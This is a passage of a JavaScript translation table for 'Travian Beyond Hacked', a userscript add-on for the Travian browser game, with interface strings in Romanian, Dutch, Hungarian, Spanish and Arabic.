	'FRIGO': 'Frigo',
	'TOOLS': 'Distanţă si timp',
	'TAB1': 'Pentru localizarea pe Travmap (rosu), separaţi fiecare alianţă cu o virgulă.(ex: A,B,C)',
	'TAB2': 'Editaţi Scurtăturile',
	'TAB3': 'Carneţel',
	'TAB4': 'Preturi vânzare la târg',
	'TAB5': 'Info tabela reprezentare ',
	'TAB6': 'Info tabela clădiri ',
	'TAB7': 'Vizualizare capacitate depozit ',
	'TAB8': 'Semn de carte construcţii administrative ',
	'TAB9': 'Semn de carte construcţii militare',
	'TAB10': 'Semn de carte construcţii ptr. îmbunătăţiri ',
	'TAB11': 'Semn decarte Perso Mik ',
	'TAB12': 'Arată Scurtăturile  ',
	'TAB13': 'Arată Info TSU ',
	'TAB13B': 'Arată Info Travian World Analyzer ',
	'TAB14': 'Arată Info Travian-search ',
	'TAB15': 'Arată Nr. pe clădiri ',
	'TAB16': 'Arată continutul mesajelor ',
	'TAB17': 'Arată Note ',
	'TAB18': 'Arată Info Travmap ',
	'TAB19': 'Semn de carte construcţie. primărie ',
	'TAB20': 'Simplifică lista legaturilor din stânga ',
	'TAB21': 'Simplifică sumarul satelor ',
	'TAB22': 'Repoziţionează sumarul satelor ',
	'CLEAN': ' Curăţă',
	'TAB24': 'Repoziţioneaza capacitate depozit ',
	'TAB25': 'Afişeaza suma trupelor in adunare ',
	'TAB26': 'Info rezumat sate',
	'TAB27': 'Image server private :[X]<br>Image server travian : [ ]',
	'TAB28': 'IDul capitalei (ex: 13695)\n<br>-> http://-/dorf1.php?newdid=13695',
	'TAB29': 'Arată icoanele extra',
	'TAB30': 'Arată Battle Analyse',
	'TAB31': 'Arată BBcode Help',
	'CLEAN': 'Şterge',
	'PAL': 'Palat',
	'RESI': 'Vilă',
	'MAN': 'Reşedinţa eroului',
	'USI': 'Armurier',
	'ARM': 'Fierărie',
	'HOT': 'Primărie',
	'IGMTITLE': 'Subiect',
	'IGMSENTER': 'Expeditor',
	'IGMDATE': 'Data',
	'IGMTIME': 'Ora',
	'IGMOUTPUT': 'Arată conţinutul mesajelor',
	'MAXTIME': 'Timp maxim',
	'LOGIN': 'Login',
	'TT': 'Hambare global',
	'RESS': 'Resurse',
	'DEP': 'Hambare în %',
	'PC': 'Puncte de cultură',
	'TROP': 'Trupe',
	'MINI': 'Mini',
	'ATT': 'Atacuri',
	'CONS': 'Clădiri',
	'FT': 'petrecere',
	'FT1': 'petrecere mică',
	'FT2': 'petrecere mare',
	'EXT': 'Expansiune',
	'IN': 'în',
	'JUGADOR': 'Jucător',
	'HAB': 'Populaţie',
	'COORD': 'Coordonate',
	'ACCION': 'Acţiuni',
	'MAPSCAN': 'Scan hartă',
	'aid': 'Ajutor',
	'VITS': 'Viteza',
	'CAPA': 'Capacitate',
	'DIST': 'Distanţa',
	'MP': 'Aduagă la scurtături ',
	'UPDATE_CHECK': 'Update Check',
	'LAST_VERSION': 'Versiunea actuală',
	'NEW_VERSION': 'O versiune nouă este disponibilă',
	'UPDATE_NOW': 'Update acum',
	'R1': 'Legionar', //Romans
	'R2': 'Pretorian',
	'R3': 'Imperian',
	'R4': 'Equites Legati',
	'R5': 'Equites Imperatoris',
	'R6': 'Equites Caesaris',
	'R7': 'Berbec',
	'R8': 'Catapulta',
	'R9': 'Senator',
	'R10': 'Colonist',
	'T1': 'Măciucar', //Teutons
	'T2': 'Lancier',
	'T3': 'Executor',
	'T4': 'Spion',
	'T5': 'Paladin',
	'T6': 'Cavale Teuton',
	'T7': 'Berbec',
	'T8': 'Catapulta',
	'T9': 'Căpetenie',
	'T10': 'Colonist',
	'G1': 'Scutier', //Gauls
	'G2': 'Pedestru',
	'G3': 'Iscoada',
	'G4': 'Călaret Fulger',
	'G5': 'Druidieri',
	'G6': 'Tarabostes',
	'G7': 'Berbec',
	'G8': 'Catapulta',
	'G9': 'General',
	'G10': 'Colonist',
	'N1': 'Şobolan', //Nature
	'N2': 'Paianjen',
	'N3': 'Şarpe',
	'N4': 'Liliac',
	'N5': 'Mistreţ',
	'N6': 'Lup',
	'N7': 'Urs',
	'N8': 'Crocodil',
	'N9': 'Tigru',
	'N10': 'Elefant',
	'LVL': 'Nivel',
	'MARC': 'Curier',
	'TOTAL': 'Total',
	'WASTED_SPACE': 'Loc liber',
	'TBH_SETUP_I': 'Travian Beyond Hacked : Setări ',
	'TBH_SETUP_T': 'Travian Beyond Hacked : Text',
	'SAVEREPORT': 'Salvează raportul',
	'ANONYMIZE': 'Anonim',
	'LBA0':'Puterea totală de atac',
	'LBA2':'Puterea totală de apărare înpotriva infanteriei',
	'LBA3':'Puterea totală de apărare înpotriva cavaleriei',
	'LBA4':'Statistica generală:',
	'LBA5':'Pierderi',
	'LBA6':'Consum',
	'LBA7':'Exp.erou',
	'LBA9':'Echivalentul pierderilor in resurse',
	'LBA10':'Consumul total de crop',
	'LBA11':'Eroul nu a participat',
	'LBA12':'Erou',
	'LBA13':'Cantitatea totală jefuită',
	'LBA14':'Capacitatea totală de transport',
	'LBA15':'Atacator',
	'LBA16':'Apărător'
	}
	break;
	case "nl":		//Ngwalme
	var newLang = {
	'ALIANZA': 'Alliantie',
	'SIM': 'Aanvals_simulator',
	'SEGURO': 'Zeker weten?',
	'MARK': 'Selecteer alles',
	'PERDIDAS': 'Verlies',
	'RENT': 'Winst',
	'SUBIR_NIVEL': 'Uitbreiding beschikbaar',
	'ALDEA': 'Dorpsnaam',
	'ATACAR': 'Aanval',
	'COMERCIAR': 'Stuur Grondstoffen',
	'GUARDADO': 'Opgeslagen',
	'DESP_ABR': 'Mov.',
	'FALTA': 'Nog nodig',
	'HOY': 'vandaag',
	'MANYANA': 'morgen',
	'PAS_MANYANA': 'overmorgen',
	'MERCADO': 'Marktplaats',
	'CUARTEL': 'Barakken',
	'PUNTO': 'Verzamelplaats',
	'CORRAL': 'Stal',
	'TALLER': 'Werkplaats',
	'ENVIAR': 'Stuur grondstoffen',
	'COMPRAR': 'Koop',
	'VENDER': 'Verkoop',
	'ENVIAR_IGM': 'Stuur IGM',
	'LISTO': 'Klaar',
	'EL': 'om',
	'A_LAS': 'op',
	'EFICIENCIA': 'Efficiëntie',
	'NUNCA': 'Nooit',
	'PC': 'cultuur punten',
	'FUNDAR': 'Je kunt een nieuw dorp stichten of overnemen',
	'TIEMPO': 'Tijd',
	'STAT': 'Statistic',
	'OFREZCO': 'Aanbiedend',
	'BUSCO': 'Zoekend naar',
	'TIPO': 'Type',
	'CUALQUIERA': 'Alle',
	'DISPONIBLE': 'Alleem beschikbaar',
	'SI': 'Ja',
	'NO': 'Nee',
	'MARCADORES': 'Bookmarks',
	'ANYADIR': 'Voeg toe',
	'ENLACE': 'New Bookmark URL',
	'TEXTO': 'New Bookmark Text',
	'ARCHIVE': 'Archieveer',
	'ELIMINAR': 'Verwijder',
	'ACTUALIZAR': 'Ververs',
	'REFRESH_INFORMARION': 'Ververs Info',
	'RESUMEN': 'Summary',
	'RECURSO1': 'Hout',
	'RECURSO2': 'Klei',
	'RECURSO3': 'IJzer',
	'RECURSO4': 'Graan',
	'ALDEA_EXTRA1': 'Stuur troepen',
	'ALDEA_EXTRA2': 'Stuur grondstoffen',
	'ALDEA_EXTRA3': 'Centereren op map',
	'ALDEA_EXTRA4': 'View Global on village',
	'ALDEA_EXTRA5': 'Centering on village',
	'ALDEA_EXTRA6': 'Info TSU',
	'ALDEA_EXTRA6B': 'Info Travian World Analyzer',
	'ALDEA_EXTRA7': 'Info Travian-search',
	'ALDEA_EXTRA8': 'Location on Travmap',
	'ADD_ALL': 'Alle GS ',
	'DEMO': 'Gebouwen afbreken',
	'FRIGO': 'Frigo',
	'TOOLS': 'Afstanden en tijd',
	'PAL': 'Paleis',
	'RESI': 'Residentie',
	'MAN': 'Heldenhof',
	'USI': 'Uitrustingssmederij',
	'ARM': 'Wapensmid',
	'HOT': 'Hoofdgebouw',
	'IGMTITLE': 'Onderwerp',
	'IGMSENTER': 'Afzender',
	'IGMDATE': 'datum',
	'IGMTIME': 'tijd',
	'IGMOUTPUT': 'Toon inhoud v/d berichten ',
	'MAXTIME': 'Max tijd',
	'TT': 'Total view',
	'RESS': 'Means',
	'DEP': 'Store of means',
	'PC': 'PC',
	'TROP': 'Troepen',
	'MINI': 'Mini',
	'ATT': 'Aanvallen',
	'CONS': 'Building',
	'FT': 'Feest',
	'FT1': 'Klein feest',
	'FT2': 'Groot feest',
	'EXT': 'Extension',
	'IN': 'in',
	'JUGADOR': 'Speler',
	'HAB': 'Populatie',
	'COORD': 'Co&ouml,rd',
	'ACCION': 'Acties',
	'LVL': 'niveau',
	'MARC': 'Handelaren'
	}
	break;
	case "hu":		//Hungarian translation: DerekZ/Booboo
	var newLang = {
	'ALIANZA': 'Klán',
	'SIM': 'Harcszimulátor',
	'SEGURO': 'Biztos vagy benne?',
	'MARK': 'Összes kijelölése',
	'PERDIDAS': 'Veszteség',
	'RENT': 'Haszon',
	'SUBIR_NIVEL': 'Fejleszthető',
	'ALDEA': 'Falu neve',
	'ATACAR': 'Támadás',
	'COMERCIAR': 'Nyersanyag küldése',
	'GUARDADO': 'Mentve',
	'DESP_ABR': 'Ugrás',
	'FALTA': 'Szükséges még',
	'HOY': 'ma',
	'MANYANA': 'holnap',
	'PAS_MANYANA': 'holnapután',
	'MERCADO': 'Piac',
	'CUARTEL': 'Kaszárnya',
	'PUNTO': 'Gyülekezőtér',
	'CORRAL': 'Istálló',
	'TALLER': 'Műhely',
	'ENVIAR': 'Nyersanyag küldése',
	'COMPRAR': 'Vásárlás',
	'VENDER': 'Eladás',
	'ENVIAR_IGM': 'Üzenet küldése',
	'LISTO': 'Kész',
	'EL': 'ezen a napon:',
	'A_LAS': 'ekkor: ',
	'EFICIENCIA': 'Hatásfok',
	'NUNCA': 'Soha',
	'PC': 'kulturális pont',
	'FUNDAR': 'Új falut alapíthatsz vagy foglalhatsz',
	'TIEMPO': 'Idő',
	'STAT': 'Statisztika',
	'OFREZCO': 'Kínál',
	'BUSCO': 'Keres',
	'TIPO': 'Típus',
	'CUALQUIERA': 'Bármi',
	'DISPONIBLE': 'Lehetséges',
	'SI': 'Igen',
	'NO': 'Nem',
	'MARCADORES': 'Könyvjelző',
	'ANYADIR': 'Hozzáad',
	'ENLACE': 'Új könyvjelző URL-je',
	'TEXTO': 'Új könyvjelző Neve',
	'ARCHIVE': 'Archívum',
	'ELIMINAR': 'Eltávolítás',
	'ACTUALIZAR': 'frissítés',
	'REFRESH_INFORMARION': 'Frissítés',
	'RESUMEN': 'Összegzés',
	'RECURSO1': 'Fa',
	'RECURSO2': 'Agyag',
	'RECURSO3': 'Vasérc',
	'RECURSO4': 'Búza',
	'ALDEA_EXTRA1': 'Egység küldése',
	'ALDEA_EXTRA2': 'Nyersanyag küldése',
	'ALDEA_EXTRA3': 'Térkép központosítása',
	'ALDEA_EXTRA4': 'Falu általános nézet',
	'ALDEA_EXTRA5': 'Faluközpont',
	'ALDEA_EXTRA6': 'TSU info',
	'ALDEA_EXTRA6B': 'Travian World Analyzer info',
	'ALDEA_EXTRA7': 'Travian-search info',
	'ALDEA_EXTRA8': 'Hely a TravMap-en',
	'ADD_ALL': 'Összes ',
	'DEMO': 'Főépület',
	'FRIGO': 'Frigo',
	'TOOLS': 'Távolság és idő',
	'TAB1': 'Travmap-en való megjelenítéshez (piros), válaszd el a klánok nevét vesszővel (pl.: A,B,C)',
	'TAB2': 'Könyvjelzők szerkesztése',
	'TAB3': 'Jegyzettömb',
	'TAB4': 'Eladás a Piacon',
	'TAB5': 'Határföldek építési lehetőségeinek mutatása',
	'TAB6': 'Faluközpont építési lehetőségeinek mutatása',
	'TAB7': 'Raktár telítődés idejének mutatása',
	'TAB8': 'Könyvjelzők: Palota/Rezidencia/Hősök háza',
	'TAB9': 'Könyvjelzők: Kaszárnya/Istálló/Műhely',
	'TAB10': 'Könyvjelzők: Páncélkovács/Fegyverkovács',
	'TAB11': 'Összefoglaló táblázat könyvjelzőinek mutatása',
	'TAB12': 'Könyvjelzők mutatása',
	'TAB13': 'TSU info mutatása',
	'TAB13B': 'Travian World Analyzer info mutatása',
	'TAB14': 'Travian-search info mutatása',
	'TAB15': 'Épületek szintjének mutatása',
	'TAB16': 'Üzenetek tartalmának mutatása',
	'TAB17': 'Jegyzettömb jobb oldalt',
	'TAB18': 'TravMap info mutatása',
	'TAB19': 'Könyvjelzők: Tanácsháza',
	'TAB20': 'Egyszerű linklista a bal oldalon',
	'TAB21': 'Egyszerűsített összefoglaló a falvakról',
	'TAB22': 'Faluösszefoglalók újrapozícionálása',
	'TAB23': 'Egységek küldése: rablás [ ], normál támadás [x]',
	'TAB24': 'Nyersanyagszámlálók [ ]-alul, [x]-felül',
	'TAB25': 'Az adott faluban képzett összes egység mutatása',
	'TAB26': 'Összefoglaló táblázat a falvakról',
	'TAB27': 'Privát képszerver: [ ]<br>Travian képszerver: [x]',
	'TAB28': 'Add meg a főfalu ID-jét (pl.: 13695)\n<br>-> http://-/dorf1.php?newdid=13695',
	'TAB29': 'Bővített ikonok mutatása',
	'TAB30': 'Csata elemző',
	'TAB31': 'BBcode segítség mutatása',
	'TAB32': 'Színezés használata a határföldeken',
	'TAB33': 'NPC segítő mutatása',
	'TAB34': 'Gyors jelentések',
	'TAB35': 'Az egység sebessége a felugró ablakokhoz (pl. a szenátornak 4)',
	'CLEAN': 'Törlés',
	'PAL': 'Palota',
	'RESI': 'Rezidencia',
	'MAN': 'Hősök háza',
	'USI': 'Páncélkovács',
	'ARM': 'Fegyverkovács',
	'HOT': 'Tanácsháza',
	'IGMTITLE': 'Téma',
	'IGMSENTER': 'küldő',
	'IGMDATE': 'dátum',
	'IGMTIME': 'idő',
	'IGMOUTPUT': 'Levelek tartalmának mutatása',
	'MAXTIME': 'Max idő',
	'LOGIN': 'Bejelentkezés',
	'TT': 'Teljes nézet',
	'RESS': 'Nyersanyag',
	'DEP': 'Raktár',
	'PC': 'KP',
	'TROP': 'Egységek',
	'MINI': 'Mini',
	'ATT': 'Támadás',
	'CONS': 'Építés',
	'FT': 'Ünnepség',
	'FT1': 'Kis ünnepség',
	'FT2': 'Nagy ünnepség',
	'EXT': 'Kiterjedés',
	'IN': '',
	'JUGADOR': 'Játékos',
	'HAB': 'Népesség',
	'COORD': 'Koordináták',
	'ACCION': 'Események',
	'MAPSCAN': 'Térkép info',
	'AID': 'Segítség',
	'VITS': 'Sebesség:',
	'CAPA': 'Terhelhetőség:',
	'DIST': 'Távolság',
	'MP': 'Könyvjelzőnek ',
	'UPDATE_CHECK': 'Újabb verzió?',
	'LAST_VERSION': 'Az elérhető legfrissebb verzió',
	'NEW_VERSION': 'Újabb verzió érhető el',
	'UPDATE_NOW': 'Frissítés most',
	'R1': 'Légió', //romain
	'R2': 'Testőrség',
	'R3': 'Birodalmi',
	'R4': 'Equites Legati',
	'R5': 'Equites Imperatoris',
	'R6': 'Equites Caesaris',
	'R7': 'Faltörő kos',
	'R8': 'Tűzkatapult',
	'R9': 'Szenátor',
	'R10': 'Telepes',
	'T1': 'Buzogányos', //teuton
	'T2': 'Lándzsás',
	'T3': 'Csatabárdos',
	'T4': 'Felderítő',
	'T5': 'Paladin',
	'T6': 'Teuton lovag',
	'T7': 'Faltörő kos',
	'T8': 'Katapult',
	'T9': 'Törzsi vazető',
	'T10': 'Telepes',
	'G1': 'Phalanx', //gaulois
	'G2': 'Kardos',
	'G3': 'Felderítő',
	'G4': 'Theutat villám',
	'G5': 'Druida lovas',
	'G6': 'Haeduan',
	'G7': 'Falromboló',
	'G8': 'Harci-katapult',
	'G9': 'Főnök',
	'G10': 'Telepes',
	'N1': 'Patkány', //nature
	'N2': 'Pók',
	'N3': 'Kígyó',
	'N4': 'Denevér',
	'N5': 'Vaddisznó',
	'N6': 'Farkas',
	'N7': 'Medve',
	'N8': 'Krokodil',
	'N9': 'Tigris',
	'N10': 'Elefánt',
	'LVL': 'Szint',
	'MARC': 'Kereskedő',
	'TOTAL': 'Összesen',
	'WASTED_SPACE' : 'Kihasználatlanul',
	'TBH_SETUP_I': 'Travian Beyond Hacked : Fontos beállítások',
	'TBH_SETUP_T': 'Travian Beyond Hacked : Szövegek',
	'SAVEREPORT': 'Jelentés mentése',
	'ANONYMIZE': 'anonim',
	'LBA0':'Teljes támadó érték',
	'LBA2':'Gyalogság elleni teljes védelem',
	'LBA3':'Lovasság elleni teljes védelem',
	'LBA4':'Általános statisztika',
	'LBA5':'Veszteség különbségek',
	'LBA6':'Ellátás',
	'LBA7':'XP a hősnek',
	'LBA9':'A veszteség mértéke búzában',
	'LBA10':'A sereg névleges ellátmánya',
	'LBA11':'Nem volt hős',
	'LBA12':'Hős',
	'LBA13':'Rabolt nyersanyag mennyisége',
	'LBA14':'Maximális teherbírás',
	'LBA15':'Támadó',
	'LBA16':'Védő',
	'LBA17': 'Másolás, és irány a harcszimulátor',
	'LBA18': 'Beillesztés',
	'BBC': 'Használható BBkódok',
	'BBC_B': 'Félkövér: [b]Szöveg[/b]',
	'BBC_I': 'Dőlt: [i]Szöveg[/i]',
	'BBC_U': 'Aláhúzott: [u]Szöveg[/u]',
	'BBC_C': 'Középre zárt: [c]Szöveg[/c]',
	'BBC_COLOR': 'Színek: [color=blue]Szöveg[/color] Tipp: A színt color=#0000FF vagy #00F formában is megadhatod.',
	'BBC_URL': 'Link: [url]http://url[/url] vagy [url=http://url]Link szöveg[/url]',
	'BBC_IMG': 'Kép: [img]URL[/img]',
	'BBC_LEFT': 'Balra igazít: [<]Szöveg[/<]',
	'BBC_RIGHT': 'Jobbra igazít: [>]Szöveg[/>]',
	'BBC_BLINK': 'Villogtat: [blink]Szöveg[/blink]',
	'THS0': 'Jelenlegi:',
	'THS1': 'Szintlépés:',
	'THS2': 'Még kell:'
	}
	break;
	case "mx":		//Español by hbautista & CaDoMi
	case "es":
	case "ar":
	case "cl":
	var newLang = {
	'ALIANZA': 'Alianza',
	'SIM': 'Simulador',
	'SEGURO': '¿Está seguro?',
	'MARK': 'Marcar todos',
	'PERDIDAS': 'Pérdidas en materiales',
	'RENT': 'Rentabilidad',
	'SUBIR_NIVEL': 'Puedes subirlo de nivel',
	'ALDEA': 'Aldea',
	'ATACAR': 'Atacar',
	'COMERCIAR': 'Comerciar',
	'GUARDADO': 'Guardado',
	'DESP_ABR': 'Desp.',
	'FALTA': 'Falta',
	'HOY': 'hoy',
	'MANYANA': 'mañana',
	'PAS_MANYANA': 'pasado mañana',
	'MERCADO': 'Mercado',
	'CUARTEL': 'Cuartel',
	'PUNTO': 'Plaza de reuniones',
	'CORRAL': 'Establo',
	'TALLER': 'Taller de maquinaria',
	'ENVIAR': 'Enviar',
	'COMPRAR': 'Comprar',
	'VENDER': 'Vender',
	'ENVIAR_IGM': 'Enviar IGM',
	'LISTO': 'Todo listo',
	'EL': 'el',
	'A_LAS': 'a las',
	'EFICIENCIA': 'Eficiencia',
	'NUNCA': 'Nunca',
	'PC': 'Punto(s) de cultura',
	'FUNDAR': 'ya puedes fundarla o conquistarla',
	'TIEMPO': 'Tiempo',
	'STAT': 'Estadísticas',
	'OFREZCO': 'Ofrezco',
	'BUSCO': 'Busco',
	'TIPO': 'Tipo',
	'CUALQUIERA': 'Cualquiera',
	'DISPONIBLE': 'Disponible',
	'SI': 'Si',
	'NO': 'No',
	'MARCADORES': 'Marcadores',
	'ANYADIR': 'Añadir',
	'ENLACE': 'Dirección del nuevo marcador',
	'TEXTO': 'Texto del nuevo marcador',
	'ARCHIVE': 'Archivo',
	'ELIMINAR': 'Eliminar',
	'ACTUALIZAR': 'Actualizar',
	'REFRESH_INFORMARION': 'Actualizar Info',
	'RESUMEN': 'Resumen',
	'RECURSO1': 'Madera',
	'RECURSO2': 'Barro',
	'RECURSO3': 'Hierro',
	'RECURSO4': 'Cereal',
	'ALDEA_EXTRA1': 'Enviar unidades',
	'ALDEA_EXTRA2': 'Enviar recursos',
	'ALDEA_EXTRA3': 'Centrar en el mapa',
	'ALDEA_EXTRA4': 'Visión global de la aldea',
	'ALDEA_EXTRA5': 'Centro de la aldea',
	'ALDEA_EXTRA6': 'Info TSU',
	'ALDEA_EXTRA6B': 'Info Travian World Analyzer',
	'ALDEA_EXTRA7': 'Info Travian-search',
	'ALDEA_EXTRA8': 'Localización en Travmap',
	'ADD_ALL': 'Para todos ',
	'DEMO': 'Edificio principal',
	'FRIGO': 'Refrigerador',
	'TOOLS': 'Distancias y tiempos',
	'TAB1': 'Para localización el Travmap (rojo), separa las múltiples alianzas con una coma.(ejem: A,B,C)',
	'TAB2': 'Editar este marcador',
	'TAB3': 'Bloc de notas',
	'TAB4': 'Precio de venta en el mercado',
	'TAB5': 'Información tabla de recursos',
	'TAB6': 'Información tabla de edificios',
	'TAB7': 'Mostrar estado depósitos',
	'TAB8': 'Marcar const. principal',
	'TAB9': 'Marcar const. militar',
	'TAB10': 'Marcar const. mejora',
	'TAB11': 'Marcar pags. personales',
	'TAB12': 'Mostrar marcadores',
	'TAB13': 'Mostrar info TSU',
	'TAB13B': 'Mostrar info Travian World Analyzer',
	'TAB14': 'Mostrar información del Travian-search',
	'TAB15': 'Mostrar N° nivel de edificios',
	'TAB16': 'Mostrar contenido de mensajes',
	'TAB17': 'Mostrar notas en mensajes',
	'TAB18': 'Mostrar información Travmap',
	'TAB19': 'Marcar Ayuntamiento',
	'TAB20': 'Simplificar lista de enlaces a la izquierda',
	'TAB21': 'Simplificar resumen de las aldeas',
	'TAB22': 'Reposicionar resumen de las aldeas',
	'TAB23': 'Ataque: Normal[x] / Atraco[ ]',
	'TAB24': 'Reposicionar medidores de depósitos',
	'TAB25': 'Mostrar el total de tropas en la aldea (Plaza de reuniones) (0 o 1)',
	'TAB26': 'Mostrar tabla resumen de la aldea (0 or 1)',
	'TAB27': 'Servidor imágenes privado :[ ]<br>Servidor imágenes Travian : [x]',
	'TAB28': 'Introducir ID de la Capital (ex: 13695)\n<br>-> http://-/dorf1.php?newdid=13695',
	'TAB29': 'Mostrar iconos mejorados',
	'TAB30': 'Mostrar analizador de batallas',
	'TAB31': 'Mostrar ayuda BBcode',
	'CLEAN': ' Limpiar',
	'PAL': 'Palacio',
	'RESI': 'Residencia',
	'MAN': 'Casa del héroe',
	'USI': 'Armería',
	'ARM': 'Herrería',
	'HOT': 'Ayuntamiento',
	'IGMTITLE': 'Tema',
	'IGMSENTER': 'Remitente',
	'IGMDATE': 'Fecha',
	'IGMTIME': 'Hora',
	'IGMOUTPUT': 'Mostrar contenido de los IGM',
	'MAXTIME': 'Tiempo máximo',
	'LOGIN': 'Entrar',
	'TT': 'Vista global',
	'RESS': 'Recursos',
	'DEP': 'Almacén',
	'PC': 'PC',
	'TROP': 'Tropas',
	'MINI': 'Mini',
	'ATT': 'Ataques',
	'CONS': 'Construcciones',
	'FT': 'Celebración',
	'FT1': 'pequeña celebración',
	'FT2': 'gran celebración',
	'EXT': 'Extensión',
	'IN': 'dentro',
	'JUGADOR': 'Jugador',
	'HAB': 'Habitantes',
	'COORD': 'Coordenadas',
	'ACCION': 'Acciones',
	'MAPSCAN': 'Revelar mapa',
	'AID': 'Ayuda',
	'VITS': 'Velocidad',
	'CAPA': 'Capacidad',
	'DIST': 'Distancia',
	'MP': 'Crear acceso rápido',
	'UPDATE_CHECK': 'Comprobar actualizaciones',
	'LAST_VERSION': 'Estás usando la última versión',
	'NEW_VERSION': 'Hay una actualización disponible',
	'UPDATE_NOW': 'Actualizar ahora',
	'R1': 'Legionario', // Romanos
	'R2': 'Pretoriano',
	'R3': 'Imperano',
	'R4': 'Equites Legati',
	'R5': 'Equites Imperatoris',
	'R6': 'Equites Caesaris',
	'R7': 'Carnero',
	'R8': 'Catapulta de fuego',
	'R9': 'Senador',
	'R10': 'Colono',
	'T1': 'Luchador de Porra', // Germanos
	'T2': 'Lancero',
	'T3': 'Luchador de Hacha',
	'T4': 'Emisario',
	'T5': 'Paladín',
	'T6': 'Jinete Teutón',
	'T7': 'Ariete',
	'T8': 'Catapulta',
	'T9': 'Cabecilla',
	'T10': 'Colono',
	'G1': 'Falange', // Galos
	'G2': 'Luchador de Espada',
	'G3': 'Batidor',
	'G4': 'Rayo de Teutates',
	'G5': 'Jinete Druida',
	'G6': 'Jinete Eduo',
	'G7': 'Carnero de madera',
	'G8': 'Catapulta de guerra',
	'G9': 'Cacique',
	'G10': 'Colono',
	'N1': 'Rata', // Naturaleza
	'N2': 'Araña',
	'N3': 'Serpiente',
	'N4': 'Vampiro',
	'N5': 'Jabalí',
	'N6': 'Lobo',
	'N7': 'Oso',
	'N8': 'Crocodilo',
	'N9': 'Tigre',
	'N10': 'Elefante',
	'LVL': 'Nivel',			// Muy importante
	'MARC': 'Mercader',		// Muy importante
	'TOTAL': 'Total',
	'WASTED_SPACE': 'Espacio libre',
	'TBH_SETUP_I': 'Travian Beyond Hacked : Importante',
	'TBH_SETUP_T': 'Travian Beyond Hacked : Texto',
	'SAVEREPORT': 'guardar informe',
	'ANONYMIZE': 'anonimizar',
	'LBA0':'Fuerza total del ataque',
	'LBA1':'Equivalencia de perdidas',
	'LBA2':'Def. infantería',
	'LBA3':'Def. caballería',
	'LBA4':'Informes estadísticos',
	'LBA5':'Dif. de pérdidas',
	'LBA6':'Consumo',
	'LBA7':'Exp de heroes',
	'LBA8':'Capacidad',
	'LBA9':'Equivalencia perdidas en recursos',
	'LBA10':'Consumo nominal en cereal del ejercito',
	'LBA11':'El héroe no era',
	'LBA12':'Héroe',
	'LBA13':'Cantidad de materias que pueden transportar',
	'LBA14':'Capacidad sobreviviente',
	'LBA15':'Ataque',
	'LBA16':'Defensa',
	'THS0': 'Actual:',
	'THS1': 'Siguiente:',
	'THS2': 'Matar:'
	}
	break;
	case "ae":		//skyline:arabic aLang "UpDated By HaMaDo"
	var newLang = {
	'ALIANZA': 'التحالف',
	'SIM': 'محاكي المعركة',
	'SEGURO': 'هل انت متأكد؟',
	'MARK': 'تحديد الكل',
	'PERDIDAS': 'الخسارة',
	'RENT': 'الربح',
	'SUBIR_NIVEL': 'قابل للأرتقاء',
	'ALDEA': 'اسم القرية',
	'ATACAR': 'هجوم',
	'COMERCIAR': 'ارسال موارد',
	'GUARDADO': 'حفظ',
	'DESP_ABR': 'انتقال',
	'FALTA': 'انت تحتاج',
	'HOY': 'اليوم',
	'MANYANA': 'غداً',
	'PAS_MANYANA': 'بعد يوم الغد',
	'MERCADO': 'السوق',
	'CUARTEL': 'الثكنة',
	'PUNTO': 'نقطة تجمع',
	'CORRAL': 'الاسطبل',
	'TALLER': 'المصانع الحربية',
	'ENVIAR': 'ارسال موارد',
	'COMPRAR': 'شراء',
	'VENDER': 'بيع',
	'ENVIAR_IGM': 'كتابه رساله له',
	'LISTO': 'جاهز',
	'EL': 'على',
	'A_LAS': 'في',
	'EFICIENCIA': 'الكفاءه',
	'NUNCA': 'ابداً',
	'PC': 'النقاط الحضارية',
	'FUNDAR': 'يمكنك ان تنشأ او تهزم قرية جديدة',
	'TIEMPO': 'الوقت',
	'STAT': 'الاحصائية',
	'OFREZCO': 'عرض',
	'BUSCO': 'بحث',
	'TIPO': 'نوع',
	'CUALQUIERA': 'الكل',
	'DISPONIBLE': 'المتوفر فقط',
	'SI': 'نعم',
	'NO': 'لا',
	'MARCADORES': 'المحفوظات',
	'ANYADIR': 'إظافة',
	'ENLACE': 'موقع جديد لمحفوظة',
	'TEXTO': 'عنوان جديد لمحفوظة',
	'ARCHIVE': 'الارشيف',
	'ELIMINAR': 'مسح',
	'ACTUALIZAR': 'تحديث',
	'REFRESH_INFORMARION': 'تحديث المعلومات',
	'RESUMEN': 'الخلاصة',
	'RECURSO1': 'خشب',
	'RECURSO2': 'طين',
	'RECURSO3': 'حديد',
	'RECURSO4': 'قمح',
	'ALDEA_EXTRA1': 'ارسال وحدات',
	'ALDEA_EXTRA2': 'ارسال موارد خام',
	'ALDEA_EXTRA3': 'مركز الخريطة',
	'ALDEA_EXTRA4': 'عرض القرية في خريطة العالم',
	'ALDEA_EXTRA5': 'مركز القرية',
	'ALDEA_EXTRA6': 'معلومات الحركة',
	'ALDEA_EXTRA6B': 'معلومات الحركة',
	'ALDEA_EXTRA7': 'معلومات عن البحث',
	'ALDEA_EXTRA8': 'الموقع في خريطة ترافيان',
	'ADD_ALL': 'للجميع ',
	'DEMO': 'المبنى الرئيسي',
	'FRIGO': 'البحث عن الخاملين',
	'TOOLS': 'المسافة و الوقت',
	'TAB1': 'الموقع على الخريطة (الأحمر) الخاصة بك ليسة بينكم وبينهم امور دبلوماسية ',
	'TAB2': 'تعديل على المحفوظات',
	'TAB3': 'المذكرة',
	'TAB4': 'سعر البيع',
	'TAB5': 'عرض معلومات الجدول وسيلة',
	'TAB6': 'عرض معلومات الجدول المباني',
	'TAB7': 'عرض الوقت المتبقي لأكتمال المخازن',
	'TAB8': 'عرض المباني الإدارية في المحفوظات',
	'TAB9': 'عرض المباني العسكرية في المحفوظات',
	'TAB10': 'عرض المباني التحسينية في المحفوظات',
	'TAB11': 'عرض المحفوظات الإضافية',
	'TAB12': 'عرض المحفوظات',
	'TAB13': 'عرض معلومات الحركة',
	'TAB13B': 'عرض معلومات الحركة',
	'TAB14': 'عرض معلومات عن البحث',
	'TAB15': 'عرض الوان الأنشاء/التطوير المباني',
	'TAB16': 'عرض محتوى الرسائل',
	'TAB17': 'عرض مذكرة الرسائل',
	'TAB18': 'عرض معلومات عن الخريطة',
	'TAB19': 'عرض البلدية في المحفوظات',
	'TAB20': 'عرض قائمة بسيطة للوصلات في الجانب الايسر',
	'TAB21': 'موجز بسيط عن القرى',
	'TAB22': 'موجز عن موقع القرى',
	'TAB23': 'تغيير هجوم: الغاره / طبيعية',
	'TAB24': 'موقع المتبقي لأكتمال المخزن',
